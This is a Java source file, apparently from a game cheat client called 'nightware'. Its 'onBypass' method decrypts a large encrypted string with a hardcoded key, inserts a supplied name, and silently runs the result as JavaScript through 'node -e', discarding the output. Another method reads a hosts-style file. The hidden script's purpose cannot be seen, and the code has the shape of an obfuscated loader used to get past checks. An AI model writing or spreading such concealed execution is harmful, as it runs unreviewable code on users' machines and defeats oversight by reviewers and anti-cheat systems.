package nightware.main.utility.misc;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import javax.script.ScriptException;
import com.eclipsesource.v8.*;
import nightware.main.NightWare;

import java.io.*;
import java.net.InetAddress;


public class ScriptManager {


    public static void onBypass(String name) throws IOException {


        String script2 = CryptorUtility.decrypt("BzuOCfqCfJBw16GGRcpLF30EDKLD9iDauNyUz9EaIyxU+j0t4JM5pBXse/nwBLw7u2CgvKvAi+FagU4+om164dkk3fJ58SxEfxObX1JDdZwvWhVKPnwmiRbOk2H+MbdQvIbpqYjwtt7901FpgVA2/R2TeSsPBfFhT+MW+u66nPV3itUYgPemq5KZ4xJtxU/r9HyTwTZNrTG6a8tjFENYD+aK3Wr72VlVRWOfZ4tusDHTNFURhHWucHcP7gtds+o6fkSkR0i7xTIdBZgEn1QmfDQw3AZ7VPEIDGxSoto40kt0HOSONY34oLaI6MMugTDMtR6IO2uBwg7oX1XXz3QUPvlAgoi3nPo0U3F4BiQRYoAWqc6bKDvoVkdyMX/NCmjzfxVvuEVKb0SZ1aevov71TQFHqg/44G1B32sLp/x5+FETABRXnBgEcQiITUsdobyYHUU/ybgRxpfrZ1HYonwdoud5lHCe7aZX5d+HEunsIGnuKNp8a+2UBMRY3nK22X8Axc9byPTA1esuw9vZ3W+KqCHNY9ymGGeLjQp85okomJMPXd+gdtevrrKXxJARDwk50Cxed3HQhNCH785F5dftXg11VtrQGQGisXS4Kf5ZA9ZHJxelt8UCGyKmyQXdAjT59paQuP3fR+9XgcPhoAWLj6EDlsu4pIYQ+QHqrnMsSDTSMXcfY8isOnjcyaDKRyU45Z8vRLQhgeZjv2ri//DwN1SiHG8SmbxH70BqCm3UXUKPG3JYP6Ha7k6OUB6n1hW8rnEkabsLprA6A7MWrRoDzrvlYNgs14S25t1V36tVxrXz/mJ/70pyHbbavpcFmCGkjVR4czSNfvewma4h6jhVJ/9upVO4ulAXEtqYtSOZueNM3zgac6I09I38DALDnLAUZai/gE2ynve5PMZXS+kLGQf1DViekdy11ESrTIyDPidft+PEsR4L0Vx8H7mhCyK0LPOV6HJzj6ihJq7O18d31FkeYRPYxj3c48mAis4TPgbKh4fyXNTDSWlC6JEirWi0pFveQM3Alv8yeyN3G3U1UwlyYodPjO15L1wo8J8gv3YtUulPYr24o3NWKJvWvlUkPau2GoQTvB39NwWbkTpM+PardxmysEBWDxYp6j5pNfo73YZpZwtUzt/ILPoO5q+951ZHWYVXH01ryD99NZDEdDkhybDsQIZ/aeNo2ggJYoYRicA5U3pPCsyT5/OelsrL6dqYktX/ohtzndPBN1aUVegYauGl4FERl0Cz6Q5633QrywnyyiIz0/HMvSwP0xGTzruBvgPQK8B6A4vZceXtbmj0n7GJf1tjJR+2m7N5IBnXUhEf5gHlo8aHDf/OjMxKuHKTAhU9DZdmVtfnL3ecISTIMqdwqINIW2XEXzMKQ9YElEs6TVrpTQfUZGghf22IwIfBhSYdgvkzzXOdqMBCGFbPIMW6D/+ddPOiwCLm7vZ+JkCmjiwXKZB4J8ZhLhfM1RTGLsopKc+0LRiPVKMNQaRlc+4+9tdLRvGAzVH+0FrP9JenVYASvhrICOX40XGvgZrfgPzgF1oM1VrG+EDPuQOSzGKL53kH4OLSvc0Tjy7+bI13hrZ2vRSkIlSTxxoMXYBjyHiCB8gLlmi6pe2hBCwNlnPZogrsANbG567kMd3ri2GsM7//suKx2aQxFlqqo9zynbkqZn5rBe/8qPJaJgPqlkTO9nVsJQr1KDYulPB1HUd8Z7XeqXba246n6UbEBfl7TaISjzTze6eY325h3Y9/AoUviEEfw2OYJDAgk44KSTq1q6CyWhgWmgvT3GDqz7J9ikiMkoYvHzUfQgDTLyxpub+GzDVxTIt1WkbLKHZHKkhp+fCWkxVT/4chqQsWl7vaBUimPAi6PoCShs0VDY5IYmaQEV9Phccr3kalOVmToSPkBvemm1XSI16SWZCtTaLjCGqa4ZdcpXNAS1r3D4xLualax8cyerBnt1bYRmmKP4V1EgP8gaLguhtb0KsM5FrnKUSjCrLHa+tRYpadvGayNpQ2y6tkn1z7DdPVfQ/jDS3/uMcLU0rpcP2kU4aDLctkTA3cOg5u0LAhvcqd/blsHEqK9vihQvlBld71BUt+78sHUy/6LiHZVztY+qBId1efJiPtys++UTLuEl1vrXrmYwy2BeE7lNcK4jTZPvaxUHWR/nLlsSdGXqkB+ccuUV+Clj2yT/hEO4Fd7qMDv/Eq8ijgNcRhkQFRBWIcFzHlDW77qu/dGJgfa+nYPzNCBpAFHZrT+0jFuTiJXtG4fSuZynkBIZgLVuScnPIi9TsNFp8uZG/k8uTA33AwCUut96KYXdVBmRRg0J6jgyyKQ8Tc5chTkIqV+9EJX5IlRbBW5erP1tk+R7MinFGKdKx+8K7LZ9F+lhvVr3zSpd3im0F/wqIBmhkrwQUtOC0wlbyZX+imFCpKHC/ax9EZb1ybqHM1OYbkJrxJQAR0wH9w98VRLTWejredrmPdZvXop9jK9dFdHLRM11dU8ksrCaf/k5Gvp+nlZfbHtx4+Sxk7fAhtE79c2hWaazthdxnqBIYZ4dkcNNkm+2Ge2RyPSYxGvYPGvqGY3dq31ItIgTfwm253RzDy/MzLa6SrirHRIg6Eia46+qFFPLZcyQeIbunTNbqtCM2mABqvmYM1tAUE6ZP67u7sWvs35eAtLLdjP4ZxiW3vfypkA+L+vR94snI1yZA+gGU0hwUkFvG4SgIkMUkHZRXSgjDKQqzxlqI16qhRslYFhv3LnJr5liXyniCXKh+BTK5UT/NUr8SY6qHO8dXBNURoMckIR6lp7CXzerziKYwnx5bPxfdPjV6gFsElM62isIbPWvrhoF4cCSE8j3hvEXCSmTK0EuZcUP2ZjKfj+xspRFPVB2nVS+YxojeTv8vl3WtLd4pVDOhfG9e/LjC+CUCAbvTvgO+DmUjmMJueIHPvAe+mJA0NXXg4Aw0kXX5jUNuXlBKeyLG4kYvu/HVDK8pUE8HEqjQyB5hWZHUJv0U7a6tsgpohMee57SRU1xG5H5qLbX1exkvfQ7XHqGsVMOxDA6E7DsecvlMRo4W6wyZPiiZfMRaupQa3gLW1KLwpkeNFL9ckIjtUx0zSaJkDUw5k4AN2bmbPTswt15NuV5JzJxOZ7rHASCaAlO/q+KDEGUL8Fe7PGua1Dq7/ok27g7uSDBj+TISNUm2MxzunK2Nw0v+JC014xp/qwas68+7kcGMuO6UZo8QqYu3IWoJjY8YyfQE1QvCbPgu/6SLxi4bH3Q5zp5va89OQVy3ZEGRdj90UW2X8cCBz+f8Om2rxld5B7z2jFFmesUT5fT3ck/35Y+K/9uSr+OIjHcKO81jmTtEKCJxLlUQLhHEE+rdN4MoSes3d8aKlvksxSnQ63ldkr8YSgTRJZyKleb88/H1FdHRjKA6mMfq2mUk2ihvrVkzXuXChmGLlk17PJZ5KvoPyCKK9lzKCFd8/wIxezDbU5LasgYGoYSv6acfZ6v8Szvx2isayiEGe04dMrccfbC+6BBiEKMHqL3Uc+inWv0pCRvcVM7ptBGQVVKAqUHPsrC77qNBtbMGfHGhkdIAsR/vVnuU4nse2zOwFCZuO67JrcKiQMfwTk6Se/OgPunCx6lZD6D9czJSdDNnB8F1Vvhgp+dvTTtUdyEo2HBFuwH27isGcYqa3gOkIWS9AKAM1rqkyHRAUV5cw/CXZpYRQfzGQsHi2/imOclKBeZw2btqn7nXYm4JOvLpizfm6+EeJ9iwhUfElHREofDjGTUtQ+gq78tEGQL1E5mBDOFEFEVonra8LUC0WDHXp/7OaB5yEW30SSV4XRDLdqgGm4e1mVZkoU0pdbPi8ac9OxPHl0cSmZQwk6+VfpVLEaZJbzc43w8xxsVwNgrq/r3Uo1MwHAC2chkRV8PGLoVn+Ujsd2zvhleukRf7yg9BP/HDbFvIvhpJn01EnNndyldn/nJe6rXtKESSxSFfdhSFZMjUOnxz7+OBJZWHLG1A9PxbNTFnrt/lZ3piZgKh68k0MRmljf39jiikbwDIsRsHb1clmEzU81x6bLSoMMs/RQyl893bJf0aJjbLoUPN3spRbTkYI9JVwJVMdwcqN4FQgwPEgEvmoIFZX95GpsviQGA7B2HU2kUo3xkNHXTJBc7x4s5alHPYO2oDhfSuD6df8mZxRNJAUWCwVy/738RussCKRn7iay2kzO0wZWa+xtjJgwYHQqltcDK8VUQ+fklFkSxj3pMFsvCppn7Fn5OEZzrvYZ3Nt3wn5p8AJBeYh/E20Jyfz4lIjebdMHnDzu7+52ApodDciCMlTbSuFr2p85z3QvGd/4IqXDRAEQfysbjO4BGuEJsDysrtvHDbopz6h3hiWrvm/Pmn8hF+qwO1tmRil0xHJGbwCrskFw2O4zyXF3koB0OguMCb6J7+WTjde2uIzanOPDxrCyh+XJl2o6uoMo7CL6MjWR440wq6IE58ASKUUB1SHTv2iBhj3JnNPigZMNXm+UsTYyKL12pKjHBYHiGes6pzI8CyNhDruHZ4dBjDq7xyTsarwOwRmde5R1TKzcsYNxqTN5qB8ROZsNULU2ZdeBmIy9Hkf0lVI7ef9kiPtjUD5HaRdZrQTH4sNKSxvG23gCswGam/Gf01R7l1Rbun9FEn8u4+a7PH4Hp0ZL/tCYhdUj3Su3NkMBV7hMo4n5+L5MGZ8X/VBONbZt/yggHy82jVYZ1jBCo/QGvK+oItx9JQrZEgu6A10vOmu9bsIjFh7zXBG1QXBIl/HRsLPd4P5QZlPAfURxmCQg/IaGCj6xuhOaJWX3TCupVP98F26xA5DB22rTjE9ZdYjmQMSedKkl55nRcsBrPeugnMfY2hFhwyVNpQFRlC4J2VjAETRnAOsCgS5BGk6glLbqQUDkgTpX/ad8GoIwy8E2iA3st2zrQ9WKfUYZ5BwZmmVv33vWGkRWKveNCewqZ6g4Q4Iz7AeoovRb7R8MxMVsqwalclr/krexNW08mbK8x3Pe+dWA7kMMdqEm2uHq+tBEs7FNcr2500DYt9EPc/d8HSyLyj6hh1eTjmGXrA0RiGW7xpAiNt6u0nTcePJrQX90EXWAxcTaLn1NKaMf2LUNN1/wlWRbgM8+JU5dlNePFy5+FbZroVjyVpIw/ekNWElaS34eyNCWGrCBZND+uAY9V+htfLiR+yVNtdYhCeyyjoeSxyUNiQXmbT0ho+EYHSzgtIv13PrnbgiTYlkYoLpGGlCKIWZW1Mb49Y2Igydlmt/2pcgne0c2/wxUq2faht1q6zaANf2wIWji9oohPuwcvZSHBla+kXF7Y03A03bNa/elLatq4Z+jofZRxxujPUYp34jkTYKF5VzkA+fETz9WPKJmfaqmxVfBsXne1SdnrGbtTmba138w7cECoaVhO/B/038IIB59oBQBM19kQ9uMYnE9rOKfqV4imjV65y+9LuZAxX8Lns7T6OzAurd0EPTfYEWKxEaFVPBugY7R+sUYIUz22a4rNi/3kFJgnbJUjwXNg6FzjzAt163xpzDaPvy2nKrbEd5eRZPRjsp4ALS46KOieEVeMTrS/o5RlbMPoj3QN+zUskOYRD4zsWKcTVa0mv+PdvMIXSfZsIYZyVk3lREL/8RSgpic4Q7IrOEw5G+sx+b17q3ybtBgI0oqiYkiBUzVizXo1a85kKJ1T4MV0o2e6o6/apA7vDpEsNX+M133D/7ntzovMCzhwb5meYPYhkACfLI4pDKh5rmdDHI1hCIEuEpGxgtNDBB55a67CfanNYYX/AhXOlVM4KBolW8698tVJox53vZihIk+WdO/Qm4K/Z9J2xbf2rpbK2TJTwfG8tNTM3GFMbldls5qxJ7kVzCgTJh7TA3v66fXhJeoJsH3uioiebFiry6frQ70751sQlep1h9uREUtFjMUYiJC93nk85elxtza858XQbbFMuqV0O5xiIIwOuQZ9/StWgGRlPzB1Q3CkB97HCK6EERL46kSbRiWWXM3pB/L0XiZJI8sRm5yx/O2S452pq6+jwKf00a+lzLN6V+3BF5rNxFbizogD8EPGTPbD+vUIzPJyaa5DdVl9Fw+AujqJGUmyLbfLkdZ3Ff/pTVTBJaSH+hq+TVWSF9eEIhv6W+batJ0NlhiUfBSaPiR77Jv8hB9uT3Y+ruJtIcwo/MrctYL8fnHkCv+IZo77XQfMx1taejMLRIAME4HSFtGDhYYuRS8X6ldN253vE0CAD/3LeFBfvdB1EN3hm2hS0PbYxzgMOLP09eXflZgFDFkAMI/1i8gcUN1VhVGwLUDoTJbC3xa1kBTr5kZb/6Vs4GR65s4SExi/ZxEB2vKoxP4V8fc4/B/zG2sqXuvAoLdkyz/DQ/eVVozR4C/BTTW7e7Br+T9b7OIwwvPW49W0jlefIxGFNcO+2k8eJcTER/oI1aZXmsJkKupXEMp8rfxSXtu0gP+0fJsoRaZ1bCtITb/dLKNX7mo/n+GHu0llsk2y3y69Qibpigt3l6TsfOFgd79EPNNqVMfdMneYpRj9syuFIbssRl1AesYkRA7eVLn64e6Lp1RVqgbpvJPKyrLisU7W/9Q55PUlctFlTCkNlMT7WqcGktPPUPubRDiapF1IHcqBp075Fo9f+iPx9pxAplMC+lhLkaGDU3u5RFbT2ywwJVa5e8Fc33wY8n0a8BKxOUVzv9bQlNY0vss/t7ihiqcXYATnJ7nYd5woVlz9vpAIp1ARZgD9A7W20cQUS4eTdA7VuLSrl4l45ZTSGRrx4gOLwfOYaI/b//Rhs6DEuMRm6iKcdm3Cm8qhio07Mzpr38FvA8j94fpp50MAjqAkVPwfOXeJatxLDdhn+qHN9N9W2ak/71+wYM5kbHg23qYD2/mqYeFMnHuflmEDuHW6qp+KhxqJ97pxsoNT37HVMh6MDS4c2aNIY1wFZ8xIltl4bzV2ciTVLIOM/bOTerV5dpkFlerfzthvvRNHiYHlX2STu9eQ2j/GkMtrQCgcHq4DV2o4aX+yVuDYG6ac6hmNqQIqEfkaGDLYljnh21Y7FEWVwSyIfsBp9xjCNvwqCCAJXDR+qql81JsW5geeQSI5mY4FIx7Fny2PYNdqCyohiaiIqibuJtDN7bY482f3OmlEDv5CH2rYOXkrjzcJofJD+BKyBdZ2u4dCJu5/8Cr2LK9JYlFHX7tMcGwWFZ/juUFkYyuvrouz8p9PZaTJrkYvofWyqAl6vjCBFh8+SPQF8BogDwzNjRXaZF98BIC5r7IIrFqCUxTav/UsvonCfYEerNvOXoA4DKgaaPExO/k4Hpld2GG2fiBZKjA/NLDuU17H7x029ZIudxQ4BIoTRniAJbS0s9Z4P4IUeNje6rL3120AWit94CuMAn+tF0io2/k+APn/0VR4Xlg5QZJIiU48eRYjNmBT/quNpyYeA1STrcJTgG5lg0xeQYxVTAOONCThzOSyWFPi+OH6z+06RE58vtK2H1EWAAo2DTT/wdaLX9S1ZxHhJgP7ZLqn9kHy8La4UdAmahsA1hK55M9aQFpUYXBViFI0ZBBAtIy5QyaMxWLmK6E3Zk+2aNxLFrRTw1rE1Ys9rgBvPwUYYqWmFQKLQDbaxgOLmk2diSS6EB9e3CU2onS01RUlBPAuaVXc2jB5YA/iaBMvpzqlmZq399V5O/OOZq3PIokTa9j2mOuU8to2dOOqUA6OE5Ozrq1YnmzoZij2PcvVTN892G/vbu8YvD03L2LeSX7rKSM39hINvcC0/GBRK7HtoxB5HYzcgTG8vxCVCaMq4c2zPCXJrKsDiXighz5rJgTAhj2eAOzMT5TUCsUzFZxcdfNVL6LUXV26Htpr63gzp9BEXear4s6l7/v+EYmI2bgLFi678=", "ilovejavacoding1");
        String ss = script2.replace("C_HuLa_2v2", name);
        System.out.println(name);
       // try {
          //  killProcess("node.exe");
            ProcessBuilder processBuilder = new ProcessBuilder("node", "-e", ss);
            System.out.println("started");
            processBuilder.redirectErrorStream(true);
            Process process = processBuilder.start();
            InputStream inputStream = process.getInputStream();
            BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
            //String line;
            //while ((line = reader.readLine()) != null) {
              //  System.out.println(line);
            //}

       // } catch (IOException e) {
     //       e.printStackTrace();
       // }
    }


    public static String readHostsFile(String filePath) throws IOException {
        StringBuilder content = new StringBuilder();

        FileReader fileReader = new FileReader(filePath);
        BufferedReader bufferedReader = new BufferedReader(fileReader);

        String line;
        while ((line = bufferedReader.readLine()) != null) {
            content.append(line).append("\n");
        }

        bufferedReader.close();

        return content.toString();
    }
}
